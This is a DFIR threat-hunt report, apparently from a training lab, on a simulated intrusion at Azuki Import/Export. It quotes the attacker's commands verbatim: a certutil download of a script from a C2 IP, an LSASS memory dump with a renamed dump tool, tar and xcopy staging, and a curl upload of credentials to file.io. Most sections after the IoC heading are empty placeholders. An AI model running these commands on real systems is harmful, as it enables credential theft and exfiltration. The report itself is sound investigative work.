<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/2fb944a4-843c-4169-8b62-f8996a89fcfe" />

# Threat-Hunt: Cargo-Hold

# Index
- [Executive Summary](#executive-summary)
- [Technical Analysis](#technical-analysis)
- [Affected Systems & Data](#affected-systems--data)
- [Evidence Sources & Analysis](#evidence-sources--analysis)
- [Indicators of Compromise (IoCs)](#indicators-of-compromise-iocs)
- [Root Cause Analysis](#root-cause-analysis)
- [Technical Timeline](#technical-timeline)
- [Nature of the Attack](#nature-of-the-attack)
- [Impact Analysis](#impact-analysis)
- [Response and Recovery Analysis](#response-and-recovery-analysis)
- [Immediate Response Actions](#immediate-response-actions)
- [Eradication Measures](#eradication-measures)
- [Recovery Steps](#recovery-steps)
- [Post-Incident Actions](#post-incident-actions)
- [Annex A](#annex-a)
- [Technical Timeline](#technical-timeline-1)

# Executive Summary
## Incident ID:
- INC2025-0011-019

## Incident Severity:
- Severity 1 (Critical)

## Incident Status:
- Resolved

## Incident Overview:
- After establishing initial access on November 19th, network monitoring detected an unauthorized entity returning approximately 72 hours later at precisely `2025-11-22T00:27:58.4166424Z`. Suspicious lateral movement and large data transfers were observed overnight on the file server. Evidence of credential collection and exfiltration of data were followed by actions that align with persistence for continued privileges and anti-forensic attempts.

## Key Findings:
Due to a compromised device, the unauthorized entity performed lateral movement and discovered a critical server `azuki-fileserver01` through remote share enumeration. The threat actor then continued to probe for privilege and network enumeration. They then implemented a staging directory and began steps for defensive evasion by attempting to hide the staging directory path through obfuscation. Using legitimate system utilities with network capabilities, the unauthorized entity then weaponized "Living off the Land" techniques to download a script into the staging directory.<br>

The C2 IP address used to download the script `ex.ps1` was identified as `78.141.196.6` to the staging directory `C:\Windows\Logs\CBS\`. Credential file discovery was used for collection and created the file `IT-Admin-Passwords.csv` within the staging directory. The built-in system utility "xcopy.exe" was used in attempt to reduce the chance of detection of security alerts to stage data from the network share `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`. The compression tool "tar.exe", which is not native to legacy Windows environments, then was utilized to archive collected data using the command `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`. In order to avoid signature-base detection, the credential dumping tool was renamed to `pd.exe` and the process memory dump command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` performed the collection.<br>

Exfiltration steps were then initiated by `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` which uses the cloud file sharing service file.io. Registry autorun keys were created for persistence with the registry value name `FileShareSync` which used the process `svchost.ps1` to masquerade the malicious files as legitimate Windows components to avoid suspicion. As an attempt at anti-forensics, the malicious actor then targeted the PowerShell command history `ConsoleHost_history.txt` for deletion.

## Immediate Actions:
- The SOC and DFIR teams exclusively managed the incident response procedures internally. Immediate action was taken to isolate the compromised systems from the network through the use of VLAN segmentation. To facilitate a comprehensive investigation, the SOC and DFIR teams gathered extensive data which included network traffic capture files. Additionally, all affected systems were plugged to a host security solution and all event logs were automatically collected by the existing SIEM.

## Stakeholder Impact:
### Customers:
- The credentials of IT accounts were exfiltrated and there is a potential that customer information may have been impacted as well. Potential future impersonations of IT staff and the possibility of customer data being at risk are a possibility. Concerns with confidentiality of customer data is a priority and as a precautionary measure, some services were temporarily taken offline. In addition, some API keys were revoked which may have led to a brief period of downtime for customers. The financial implications of this downtime are currently being assessed but could result in the loss of revenue and customer trust.

### Employees:
- The compromised device `azuki-fileserver01` housed sensitive employee information and has been identified as a major risk to employees. There has been a known remote accessed account `kenji.sato` that has been identified to have been compromised earlier and eventually led to this particular incident. The potential for identity theft, phishing attacks, and unauthorized access is critical.

### Business Partners:
- The fileserver affected by this incident has been known to hold information with business partners and company data. The unintended distribution of proprietary code or technology is concerning. There may be ramifications for business partners who rely on the integrity and exclusivity of Azuki Import/Export Trading CO., LTD.

### Regulatory Bodies:
- The breach of systems could have compliance implications. Regulatory bodies may impose fines or sanctions on Azuki Import/Export Trading CO., LTD for failing to adequately protect sensitive data. This ultimately falls on the jurisdiction and nature of the compromised data.

### Shareholders:
- This incident could have a short-term negative impact on stock prices due to the potential loss of customer trust and possible regulatory fines. Long-term effects will depend on the effectiveness of remedial actions taken and the company's ability to restore stakeholder confidence.

# Technical Analysis
## Affected Systems & Data
Due to insufficient network access controls, the unauthorized entity established initial access and waited (dwell time), before continuing operations. The threat actor successfully gained access over the following:

### Devices:
- `azuki-sl`
- `azuki-fileserver01`
### Accounts:
- `fileadmin`
- `kenji.sato`
  
## Evidence Sources & Analysis
After establishing initial access on November 19, 2025, network monitoring within the SOC detected the attacker returning approximately 72 hours later (`2025-11-22T00:27:58.4166424Z`). Suspicious lateral movement and large data transfers were observed overnight on the file server.

<img width="1168" height="304" alt="image" src="https://github.com/user-attachments/assets/bd9e8334-3d45-45f3-87eb-d2d452ae764d" />

The remote IP `159.26.106.98` made a successful logon to the device `azuki-sl` through the compromised account `kenji.sato` at `2025-11-22T00:27:58.4166424Z`. After this point, suspicious actions were taken and malicious intent were apparent.<br>

<img width="1968" height="498" alt="image" src="https://github.com/user-attachments/assets/ec2d9532-d6c5-46cf-b2e4-656478fc04dd" />

Lateral movement was observed across many devices which was sourced from a Remote Access Tool (RAT) with the process name `mstsc.exe`.

<img width="1781" height="553" alt="image" src="https://github.com/user-attachments/assets/74724b07-62a7-4bf4-a785-416eb6a43c1b" />

Queries for any remote sessions with successful logon attempts discovered suspicious activity involving the critical fileserver `azuki-fileserver01`.

<img width="1816" height="488" alt="image" src="https://github.com/user-attachments/assets/fcc5792a-a78c-44de-9fa7-00a9b9c77d53" />

Continual lateral movement was observed and reached an administrative account `fileadmin`. This account was then used for privilege escalation and enumeration tactics.

<img width="1756" height="543" alt="image" src="https://github.com/user-attachments/assets/237afb96-5af7-439a-a50a-8b92fa8077ea" />

At `2025-11-22T00:40:54.8271951Z`, the initial enumeration attempts were conducted using the `"net.exe" share` command. Proceeding this command, enumeration of remote shares were found to identify accessible file servers and data repositories across the network. This was executed by the command `"net.exe" view \\10.1.0.188` at `2025-11-22T00:42:01.9579347Z`.

<img width="1587" height="432" alt="image" src="https://github.com/user-attachments/assets/381aee74-2986-4a2c-960a-b84ff2c934fe" />

Privilege enumeration tactics continued with intent to determine what actions can be performed and whether privilege escalation is required.

<img width="1529" height="397" alt="image" src="https://github.com/user-attachments/assets/1bd58659-5f3f-463e-9eb0-53a083a512b3" />

Network configuration enumeration actions were performed in order to scope the environment, identify domain membership, and discover additional network segments.

<img width="1558" height="397" alt="image" src="https://github.com/user-attachments/assets/32e20007-5f59-46d0-b5ce-c22fd74fa1a0" />

Modifications to file system attributes were done with the intent to hide the staging directory from users and security tools. The staging path `C:\Windows\Logs\CBS` was created and modified to organize tools and stolen data before exfiltration. This directory path is directly linked to the IoC (Indicators of Compromise).

<img width="1877" height="538" alt="image" src="https://github.com/user-attachments/assets/c788caaf-38fd-4a27-8e2e-6eda6d9ddf54" />

The earliest signs of malicious command execution point to the unauthorized download of a suspicious script by using legitimate system utilities with network access.<br>

The PowerShell script `ex.ps1` was downloaded at using the command `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` which also established the first contact of the C2 server `78.141.196.6`.<br>

From the logs, the PowerShell script `ex.ps1` was downloaded into the staging directory `C:\Windows\Logs\CBS\` through the IP address `78.141.196.6`. The script then triggered events that collected credentials, prepared the data for exfiltration, and exfiltrated the stolen data through a cloud service.<br>

<img width="1409" height="524" alt="image" src="https://github.com/user-attachments/assets/b59ab898-9cb3-4387-a55d-48f06d0fafed" />

Along with other potentially sensitive or private information, a credential file was created within the staging directory named `IT-Admin-Passwords.csv`. The naming convention may have suggested the intent to obtain credentials with administrative access.

<img width="1977" height="517" alt="image" src="https://github.com/user-attachments/assets/a956cee7-d900-4ed6-801a-baeb992e2a2a" />

Using built-in commands, in an attempt to lower the chances of triggering security alerts, the data was staged from a network share.

<img width="1838" height="491" alt="image" src="https://github.com/user-attachments/assets/db3dc076-d115-4175-a55d-d5d46e586394" />

Cross-platform compression tools were utilized to compress and prepare the staged data for collection.

<img width="1182" height="335" alt="image" src="https://github.com/user-attachments/assets/7e6d67df-9838-4aca-8e79-553c9d68cae5" />

The credential dumping tool was renamed to a less conspicuous filename as `pd.exe`.

<img width="1542" height="392" alt="image" src="https://github.com/user-attachments/assets/4cdeab92-9dfe-490b-be4e-89c7404f5bf4" />

Credentials were extracted using a process memory dump. The correlation between the previously identified tool `pd.exe`, and the critical security process `lsass`, suggests that the tool used the command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` to extract credentials into the staging directory.

<img width="1950" height="506" alt="image" src="https://github.com/user-attachments/assets/8bc85ab9-3341-4ce2-bb92-f45347318603" />

Exfiltration of data was confirmed through the usage of command-line HTTP clients that enabled scriptable data transfers. This command syntax can be added to the detection rules of the defender team. The evidence indicates that there were many transfers of varying file names which could potentially have sensitive stakeholder information.

<img width="1973" height="472" alt="image" src="https://github.com/user-attachments/assets/ff379502-3cc9-4687-a2e0-0971ff6cafba" />

A registry value name used to create persistence. Named `FileShareSync`, this registry value modification targeted a well-known autostart location. The malicious actor chose a value name designed to appear as legitimate software.

<img width="1897" height="485" alt="image" src="https://github.com/user-attachments/assets/fdb1b189-1ef3-4a13-b809-5bb06cdeaa45" />

Evidence of persistence was found in the form of an obfuscated PowerShell file `svchost.ps1`.

<img width="1380" height="402" alt="image" src="https://github.com/user-attachments/assets/a50b976e-ccda-4614-9f1a-2566a0fdf18b" />

Anti-forensic attempts were apparent by the deletion of the PowerShell history file `ConsoleHost_history.txt`. PowerShell saves command history to persistent files that survive session termination. Attackers target these files to cover their tracks.

## Indicators of Compromise (IoCs)
### C2 IP:
## Root Cause Analysis

# Technical Timeline
## Initial Compromise
## Lateral Movement
## Data Access & Exfiltration
## C2 Communications
## Malware Deployment or Activity
## Containment Times
## Eradication Times
## Recovery Times

# Nature of the Attack

## Data Access & Exfiltration

## C2 Communications

## Containment Times

## Eradication Times

## Nature of the Attack


# Impact Analysis

# Response and Recovery Analysis

# Immediate Response Actions
## Revocation of Access
### Identification of Compromised Accounts / Systems:
### Timeframe:
### Method of Revocation:
### Impact:
## Containment Strategy
### Short-Term Containment:
### Long-Term Containment:
### Effectiveness:

# Eradication Measures
## Malware Removal:
## System Patching:
### Vulnerability Identification:
### Patch Management:
### Fallback Procedures:

# Recovery Steps
## Data Restoration
### Backup Validation:
### Restoration Process:
### Data Integrity Checks:
## System Validation
### Security Measures:
### Operational Checks:

# Post-Incident Actions
## Monitoring
### Enhanced Monitoring Plans:
### Tools and Technologies:
## Lessons Learned
### Gap Analysis:
### Recommendations for Improvement:
### Future Strategy:

# Annex A

# Technical Timeline
|      Time      |                                                              Activity                                                              |
|----------------|------------------------------------------------------------------------------------------------------------------------------------|
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
